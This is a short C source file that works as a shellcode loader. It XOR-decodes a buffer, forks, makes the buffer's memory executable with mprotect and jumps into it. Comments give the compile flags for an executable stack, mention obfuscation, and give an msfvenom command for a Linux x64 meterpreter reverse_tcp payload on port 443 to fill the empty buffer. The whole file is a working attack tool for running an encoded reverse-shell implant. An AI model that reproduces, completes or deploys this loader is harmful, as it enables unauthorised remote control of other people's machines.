#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// randomly placed newlines for further obfuscation
//
// Compile: gcc runner.c -o runner -z execstack
//
//Shellcode goes here
// msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=? lport=443 -f c
unsigned char buf[] = "";

int main(int argc, char **argv)
{
	printf("[*] Executing shellcode...\n");

  //Decryption below
	char key = 'P';
	int arraysize = (int) sizeof(buf);
	
  for (int i = 0; i < arraysize - 1; i++)
	{
		buf[i] = buf[i] ^ key;
	}

	printf("[*] Checking for forked process...\n");
	printf("\n");

	if (fork()== 0)
	{
		intptr_t pagesize = sysconf(_SC_PAGESIZE);
		if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
					pagesize, PROT_READ|PROT_EXEC)) {
			perror("mprotect");
			return -1;
		}
		printf("\n");

		int (*ret)() = (int(*)())buf;
		ret();
		printf("\n");
	} else {
		printf("[*] Returning from function... \n");
		//return 0;
	}
	printf("\n");
	return 3;
}
